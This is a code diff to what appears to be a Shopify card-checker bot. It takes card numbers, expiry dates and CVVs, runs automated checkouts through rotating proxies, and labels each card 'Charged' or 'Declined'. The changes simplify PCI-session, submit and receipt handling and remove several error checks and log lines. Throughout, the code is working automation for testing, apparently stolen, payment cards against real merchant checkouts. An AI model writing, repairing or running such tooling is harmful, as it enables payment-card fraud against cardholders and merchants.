@@ -330,10 +330,6 @@ def format_shopify_response(cc, mes, ano, cvv, raw_response, timet, profile, use
         response_display = "EXPIRED_CARD"
     elif "FRAUD" in raw_response.upper():
         response_display = "FRAUD"
-    elif "PCI" in raw_response.upper():
-        response_display = "PCI_ERROR"
-    elif "NO RECEIPT" in raw_response.upper():
-        response_display = "NO_RECEIPT"
     else:
         # Take first part before colon or first 30 characters
         if ":" in raw_response:
@@ -345,7 +341,7 @@ def format_shopify_response(cc, mes, ano, cvv, raw_response, timet, profile, use
 
     raw_response_upper = raw_response.upper()
 
-    # Check for SUCCESS indicators - CHANGED: Charged 💎 to Charged ✅
+    # Check for SUCCESS indicators
     if any(keyword in raw_response_upper for keyword in [
         "ORDER_PLACED", "SUBMITSUCCESS", "SUCCESSFUL", "APPROVED", "RECEIPT",
         "COMPLETED", "PAYMENT_SUCCESS", "CHARGE_SUCCESS", "THANK_YOU",
@@ -354,7 +350,7 @@ def format_shopify_response(cc, mes, ano, cvv, raw_response, timet, profile, use
         "ORDER #", "PROCESSEDRECEIPT", "THANK YOU", "PAYMENT_SUCCESSFUL",
         "PROCESSINGRECEIPT", "AUTHORIZED", "YOUR ORDER IS CONFIRMED"
     ]):
-        status_flag = "Charged ✅"  # CHANGED FROM 💎 to ✅
+        status_flag = "Charged 💎"
     # Check for CAPTCHA
     elif any(keyword in raw_response_upper for keyword in [
         "CAPTCHA", "SOLVE THE CAPTCHA", "CAPTCHA_METADATA_MISSING", 
@@ -410,12 +406,6 @@ def format_shopify_response(cc, mes, ano, cvv, raw_response, timet, profile, use
     # Check for proxy errors
     elif "NO_PROXY_AVAILABLE" in raw_response_upper or "PROXY_DEAD" in raw_response_upper:
         status_flag = "Proxy Error 🚫"
-    # Check for PCI errors
-    elif "PCI" in raw_response_upper:
-        status_flag = "Declined ❌"
-    # Check for receipt errors
-    elif "NO RECEIPT" in raw_response_upper or "RECEIPT" in raw_response_upper:
-        status_flag = "Declined ❌"
     # Default to declined
     else:
         status_flag = "Declined ❌"
@@ -1247,14 +1237,8 @@ class ShopifyHTTPCheckout:
                         if ":" in error_msg:
                             error_msg = error_msg.split(":")[0].strip()
                         return False, f"Proposal error: {error_msg}"
-                    
-                    # Check if proposal was successful
-                    if 'data' not in proposal_resp:
-                        return False, "Proposal response missing data"
-                        
                 except Exception as e:
-                    self.logger.error_log("PROPOSAL_PARSE", f"Failed to parse Proposal response: {str(e)[:100]}")
-                    return False, "Proposal parse error"
+                    return False, f"Failed to parse Proposal response: {str(e)[:50]}"
 
             except requests.exceptions.ProxyError as e:
                 self.logger.error_log("PROXY", f"Proxy error on proposal: {str(e)}")
@@ -1323,39 +1307,23 @@ class ShopifyHTTPCheckout:
                 )
 
                 if resp.status_code != 200:
-                    self.logger.error_log("PCI_STATUS", f"PCI session creation failed: {resp.status_code}")
-                    return False, f"PCI session failed: {resp.status_code}"
+                    return False, f"PCI session creation failed: {resp.status_code}"
 
                 try:
                     pci_resp = resp.json()
                     payment_session_id = pci_resp.get('id')
                     payment_method_identifier = pci_resp.get('payment_method_identifier')
-                    
                     if not payment_session_id:
-                        # Check for error in response
-                        if 'error' in pci_resp:
-                            error_msg = pci_resp.get('error', {}).get('message', 'PCI error')
-                            return False, f"PCI error: {error_msg}"
-                        return False, "No payment session ID"
-                        
+                        return False, "No payment session ID returned"
                     self.logger.data_extracted("Payment Session ID", payment_session_id, "PCI")
-                    self.logger.data_extracted("Payment Method ID", payment_method_identifier or "None", "PCI")
-                    
                 except Exception as e:
-                    self.logger.error_log("PCI_PARSE", f"Failed to parse PCI response: {str(e)[:100]}")
-                    return False, "PCI parse error"
+                    return False, f"Failed to parse PCI response: {str(e)[:50]}"
 
             except requests.exceptions.ProxyError as e:
                 self.logger.error_log("PROXY", f"Proxy error on PCI: {str(e)}")
                 mark_proxy_failed(self.proxy_url)
                 self.proxy_status = "Dead 🚫"
                 return False, "PROXY_DEAD"
-            except requests.exceptions.Timeout as e:
-                self.logger.error_log("PCI_TIMEOUT", f"PCI request timeout: {str(e)}")
-                return False, "PCI timeout"
-            except requests.exceptions.ConnectionError as e:
-                self.logger.error_log("PCI_CONNECTION", f"PCI connection error: {str(e)}")
-                return False, "PCI connection error"
             except Exception as e:
                 self.logger.error_log("PCI_ERROR", f"PCI error: {str(e)}")
                 return False, f"PCI error: {str(e)[:50]}"
@@ -1367,10 +1335,6 @@ class ShopifyHTTPCheckout:
 
             # FIXED: Generate attemptToken in correct format: checkout_token-randomstring
             attempt_token = f"{self.checkout_token}-{self.generate_random_string(12)}"
-
-            # Check if we have payment session ID
-            if not payment_session_id:
-                return False, "No payment session available"
 
             # FIXED: Correct structure based on working request
             # sessionInput is inside input object
@@ -1460,7 +1424,7 @@ class ShopifyHTTPCheckout:
                         "paymentLines": [{
                             "paymentMethod": {
                                 "directPaymentMethod": {
-                                    "paymentMethodIdentifier": payment_method_identifier or "",
+                                    "paymentMethodIdentifier": payment_method_identifier if 'payment_method_identifier' in locals() else "",
                                     "sessionId": payment_session_id,
                                     "billingAddress": {
                                         "streetAddress": {
@@ -1589,14 +1553,10 @@ class ShopifyHTTPCheckout:
                 )
 
                 if resp.status_code != 200:
-                    self.logger.error_log("SUBMIT_STATUS", f"Submit failed: {resp.status_code}")
                     return False, f"Submit failed: {resp.status_code}"
 
                 try:
                     submit_resp = resp.json()
-                    
-                    # Debug: Log the actual response structure
-                    self.logger.data_extracted("Submit Response", str(submit_resp)[:300], "Raw")
 
                     if 'errors' in submit_resp and submit_resp['errors']:
                         error_msg = submit_resp['errors'][0].get('message', 'Unknown error')
@@ -1605,93 +1565,28 @@ class ShopifyHTTPCheckout:
                             error_msg = error_msg.split(":")[0].strip()
                         return False, f"Submit error: {error_msg}"
 
-                    # FIXED: More flexible receipt ID extraction
-                    data = submit_resp.get('data', {})
-                    
-                    # Try multiple possible paths for receipt
-                    receipt_data = None
-                    
-                    # Path 1: data.submitForCompletion.receipt
-                    if 'submitForCompletion' in data:
-                        receipt_data = data['submitForCompletion'].get('receipt', {})
-                    
-                    # Path 2: data.submitForCompletionCheckout.receipt  
-                    if not receipt_data and 'submitForCompletionCheckout' in data:
-                        receipt_data = data['submitForCompletionCheckout'].get('receipt', {})
-                    
-                    # Path 3: data.receipt
-                    if not receipt_data and 'receipt' in data:
-                        receipt_data = data['receipt']
-                    
-                    # Path 4: Look for any receipt in data
-                    if not receipt_data:
-                        # Search recursively for receipt
-                        def find_receipt(obj):
-                            if isinstance(obj, dict):
-                                if 'receipt' in obj:
-                                    return obj['receipt']
-                                if '__typename' in obj and 'Receipt' in obj['__typename']:
-                                    return obj
-                                for value in obj.values():
-                                    result = find_receipt(value)
-                                    if result:
-                                        return result
-                            elif isinstance(obj, list):
-                                for item in obj:
-                                    result = find_receipt(item)
-                                    if result:
-                                        return result
-                            return None
-                        
-                        receipt_data = find_receipt(data)
-                    
-                    if not receipt_data:
-                        self.logger.error_log("RECEIPT_NOT_FOUND", "Could not find receipt in response")
-                        # Check if there's a different success indicator
-                        if 'data' in submit_resp:
-                            # Maybe it succeeded without receipt?
-                            return True, "ORDER_PLACED"
-                        return False, "No receipt found"
-                    
-                    self.receipt_id = receipt_data.get('id')
-                    
+                    data = submit_resp.get('data', {}).get('submitForCompletion', {})
+                    receipt = data.get('receipt', {})
+                    self.receipt_id = receipt.get('id')
+
                     if not self.receipt_id:
-                        # Try to get ID from different field names
-                        self.receipt_id = receipt_data.get('receiptId') or receipt_data.get('receipt_id') or receipt_data.get('orderId')
-                    
-                    if not self.receipt_id:
-                        receipt_type = receipt_data.get('__typename', '')
-                        if 'ProcessedReceipt' in receipt_type or 'ProcessingReceipt' in receipt_type:
-                            # Receipt exists but no ID - still count as success
-                            return True, "ORDER_PLACED"
-                        return False, "No receipt ID"
+                        return False, "No receipt ID in submit response"
 
                     self.logger.data_extracted("Receipt ID", self.receipt_id, "Submit")
 
-                    receipt_type = receipt_data.get('__typename', '')
-                    
-                    if receipt_type == 'ProcessingReceipt':
-                        poll_delay = receipt_data.get('pollDelay', 500) / 1000
+                    if receipt.get('__typename') == 'ProcessingReceipt':
+                        poll_delay = receipt.get('pollDelay', 500) / 1000
+
                         self.step(9, "POLL RECEIPT", f"Waiting {poll_delay}s then polling for result")
+
                         time.sleep(poll_delay)
+
                         return self.poll_receipt(proposal_headers)
-                    elif 'ProcessedReceipt' in receipt_type:
-                        return True, "ORDER_PLACED"
-                    elif 'FailedReceipt' in receipt_type:
-                        error_info = receipt_data.get('processingError', {})
-                        error_code = error_info.get('code', 'UNKNOWN')
-                        return False, f"DECLINED - {error_code}"
                     else:
-                        # Unknown receipt type but has ID - assume success
-                        return True, "ORDER_PLACED"
+                        return False, f"Unexpected receipt type: {receipt.get('__typename')}"
 
                 except Exception as e:
-                    self.logger.error_log("SUBMIT_PARSE", f"Failed to parse submit response: {str(e)[:100]}")
-                    # Check if response contains success indicators anyway
-                    resp_text = resp.text[:200]
-                    if any(success_word in resp_text for success_word in ['SUCCESS', 'APPROVED', 'ORDER_PLACED']):
-                        return True, "ORDER_PLACED"
-                    return False, "Submit parse error"
+                    return False, f"Failed to parse submit response: {str(e)[:50]}"
 
             except requests.exceptions.ProxyError as e:
                 self.logger.error_log("PROXY", f"Proxy error on submit: {str(e)}")
